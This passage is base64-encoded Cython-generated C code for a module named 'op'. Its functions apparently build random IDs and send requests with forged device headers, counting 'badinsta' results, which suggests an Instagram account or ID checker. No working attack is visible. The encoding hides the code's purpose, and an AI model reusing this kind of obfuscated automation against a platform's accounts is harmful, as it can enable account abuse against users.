9QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRpbnN0YSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM3NywgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgX19weXhfdF83ID0gX19QeXhfUHlMb25nX0FkZE9iakMoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMSwgMSwgMSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDM3NywgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRpbnN0YSwgX19weXhfdF83KSA8ICgwKSkgX19QWVhfRVJSKDAsIDM3NywgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG5cbiAgICBcbiAgICBfX3B5eF90XzEgPSBOVUxMO1xuICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHBwcCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM3OCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgX19weXhfdF80ID0gMTtcbiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMykpKSB7XG4gICAgICBfX3B5eF90XzEgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzMpO1xuICAgICAgYXNzZXJ0KF9fcHl4X3RfMSk7XG4gICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xKTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzMsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICBfX3B5eF90XzQgPSAwO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICB7XG4gICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xLCBOVUxMfTtcbiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMywgX19weXhfY2FsbGFyZ3MrX19weXhfdF80LCAoMS1fX3B5eF90XzQpIHwgKF9fcHl4X3RfNCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzc4LCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgIH1cbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgfVxuICBfX3B5eF9MMzo7XG5cbiAgXG5cbiAgXG4gIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7XG4gIGdvdG8gX19weXhfTDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygib3AuY2hlY2tfb24iLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19weXhfciA9IE5VTEw7XG4gIF9fcHl4X0wwOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3VhKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2Rldik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9kZXZpY2VfaWQpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdXVpKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hlYWRlcnMpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZGF0YSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9yZXNwb25zZSk7XG4gIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cblxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMm9wXzE3cmFuZF9pZHMoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbik7IFxuc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMm9wXzE3cmFuZF9pZHMgPSB7InJhbmRfaWRzIiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18yb3BfMTdyYW5kX2lkcywgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMm9wXzE3cmFuZF9pZHMoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbikge1xuICBQeU9iamVjdCAqX19weXhfdl9iYmsgPSAwO1xuICBQeU9iamVjdCAqX19weXhfdl9JZG8gPSAwO1xuICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gIENZVEhPTl9VTlVTRUQgUHlfc3NpemVfdCBfX3B5eF9uYXJncztcbiAgI2VuZGlmXG4gIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlcztcbiAgUHlPYmplY3QqIHZhbHVlc1syXSA9IHswLDB9O1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gMDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInJhbmRfaWRzICh3cmFwcGVyKSIsIDApO1xuICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7XG4gICNlbHNlXG4gIF9fcHl4X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7XG4gICNlbmRpZlxuICAjZW5kaWZcbiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7XG4gIHtcbiAgICBQeU9iamVjdCAqKiBjb25zdCBfX3B5eF9weWFyZ25hbWVzW10gPSB7Jl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYmssJl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9JZG8sMH07XG4gICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7XG4gICAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuKSA8IDApIF9fUFlYX0VSUigwLCAzODUsIF9fcHl4X0wzX2Vycm9yKVxuICAgIGlmIChfX3B5eF9rd2RzX2xlbiA+IDApIHtcbiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHtcbiAgICAgICAgY2FzZSAgMjpcbiAgICAgICAgdmFsdWVzWzFdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDEpO1xuICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1sxXSkpIF9fUFlYX0VSUigwLCAzODUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDE6XG4gICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMzg1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICBjYXNlICAwOiBicmVhaztcbiAgICAgICAgZGVmYXVsdDogZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjtcbiAgICAgIH1cbiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7XG4gICAgICBpZiAoX19QeXhfUGFyc2VLZXl3b3JkcyhfX3B5eF9rd2RzLCBfX3B5eF9rd3ZhbHVlcywgX19weXhfcHlhcmduYW1lcywgMCwgdmFsdWVzLCBrd2RfcG9zX2FyZ3MsIF9fcHl4X2t3ZHNfbGVuLCAicmFuZF9pZHMiLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM4NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IF9fcHl4X25hcmdzOyBpIDwgMjsgaSsrKSB7XG4gICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgicmFuZF9pZHMiLCAxLCAyLCAyLCBpKTsgX19QWVhfRVJSKDAsIDM4NSwgX19weXhfTDNfZXJyb3IpIH1cbiAgICAgIH1cbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDIpKSB7XG4gICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgIH0gZWxzZSB7XG4gICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAzODUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgdmFsdWVzWzFdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDEpO1xuICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMV0pKSBfX1BZWF9FUlIoMCwgMzg1LCBfX3B5eF9MM19lcnJvcilcbiAgICB9XG4gICAgX19weXhfdl9iYmsgPSB2YWx1ZXNbMF07XG4gICAgX19weXhfdl9JZG8gPSB2YWx1ZXNbMV07XG4gIH1cbiAgZ290byBfX3B5eF9MNl9za2lwO1xuICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7XG4gIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJyYW5kX2lkcyIsIDEsIDIsIDIsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDM4NSwgX19weXhfTDNfZXJyb3IpXG4gIF9fcHl4X0w2X3NraXA6O1xuICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lO1xuICBfX3B5eF9MM19lcnJvcjo7XG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJvcC5yYW5kX2lkcyIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIE5VTEw7XG4gIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjtcbiAgX19weXhfciA9IF9fcHl4X3BmXzJvcF8xNnJhbmRfaWRzKF9fcHl4X3NlbGYsIF9fcHl4X3ZfYmJrLCBfX3B5eF92X0lkbyk7XG5cbiAgXG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJvcF8xNnJhbmRfaWRzKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X2JiaywgUHlPYmplY3QgKl9fcHl4X3ZfSWRvKSB7XG4gIFB5T2JqZWN0ICpfX3B5eF92X0lkID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDtcbiAgc2l6ZV90IF9fcHl4X3RfNTtcbiAgaW50IF9fcHl4X3RfNjtcbiAgaW50IF9fcHl4X3RfNztcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgicmFuZF9pZHMiLCAwKTtcblxuICBcbiAgX19weXhfdF8yID0gTlVMTDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzODYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kcmFuZ2UpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAzODYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gIF9fcHl4X3RfNSA9IDE7XG4gICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNCkpKSB7XG4gICAgX19weXhfdF8yID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF80KTtcbiAgICBhc3NlcnQoX19weXhfdF8yKTtcbiAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNCk7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzQsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19weXhfdF81ID0gMDtcbiAgfVxuICAjZW5kaWZcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzIsIF9fcHl4X3ZfYmJrLCBfX3B5eF92X0lkb307XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgzLV9fcHl4X3RfNSkgfCAoX19weXhfdF81Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzODYsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICB9XG4gIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMzg2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBfX3B5eF92X0lkID0gKChQeU9iamVjdCopX19weXhfdF80KTtcbiAgX19weXhfdF80ID0gMDtcblxuICBcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pZHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAzODcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgX19weXhfdF82ID0gKF9fUHl4X1B5U2VxdWVuY2VfQ29udGFpbnNURihfX3B5eF92X0lkLCBfX3B5eF90XzQsIFB5X05FKSk7IGlmICh1bmxpa2VseSgoX19weXhfdF82IDwgMCkpKSBfX1BZWF9FUlIoMCwgMzg3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gIGlmIChfX3B5eF90XzYpIHtcblxuICAgIFxuICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaWRzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMzg4LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9BcHBlbmQoX19weXhfdF80LCBfX3B5eF92X0lkKTsgaWYgKHVubGlrZWx5KF9fcHl4X3RfNyA9PSAoKGludCktMSkpKSBfX1BZWF9FUlIoMCwgMzg4LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcblxuICAgIFxuICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X3ZfSWQpO1xuICAgIF9fcHl4X3IgPSBfX3B5eF92X0lkO1xuICAgIGdvdG8gX19weXhfTDA7XG5cbiAgICBcbiAgfVxuXG4gIFxuICAge1xuICAgIF9fcHl4X3RfMSA9IE5VTEw7XG4gICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kX2lkcyk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDM5MSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgX19weXhfdF81ID0gMTtcbiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMikpKSB7XG4gICAgICBfX3B5eF90XzEgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzIpO1xuICAgICAgYXNzZXJ0KF9fcHl4X3RfMSk7XG4gICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMik7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xKTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzIsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICBfX3B5eF90XzUgPSAwO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICB7XG4gICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF8xLCBfX3B5eF92X2JiaywgX19weXhfdl9JZG99O1xuICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8yLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgzLV9fcHl4X3RfNSkgfCAoX19weXhfdF81Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAzOTEsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgfVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICB9XG5cbiAgXG5cbiAgXG4gIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7XG4gIGdvdG8gX19weXhfTDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpO1xuICBfX1B5eF9BZGRUcmFjZWJhY2soIm9wLnJhbmRfaWRzIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX3B5eF9MMDo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9JZCk7XG4gIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cblxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMm9wXzE5dXV1KFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICp1bnVzZWQpOyBcbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJvcF8xOXV1dSA9IHsidXV1IiwgKFB5Q0Z1bmN0aW9uKV9fcHl4X3B3XzJvcF8xOXV1dSwgTUVUSF9OT0FSR1MsIDB9O1xuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18yb3BfMTl1dXUoUHlPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKnVudXNlZCkge1xuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gMDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInV1dSAod3JhcHBlcikiLCAwKTtcbiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19WQVJBUkdTKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTtcbiAgX19weXhfciA9IF9fcHl4X3BmXzJvcF8xOHV1dShfX3B5eF9zZWxmKTtcblxuICBcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8yb3BfM3V1dV8yZ2VuZXJhdG9yMyhfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKTsgXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJvcF8zdXV1X2dlbmV4cHIoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZikge1xuICBzdHJ1Y3QgX19weXhfb2JqXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByICpfX3B5eF9jdXJfc2NvcGU7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZ2V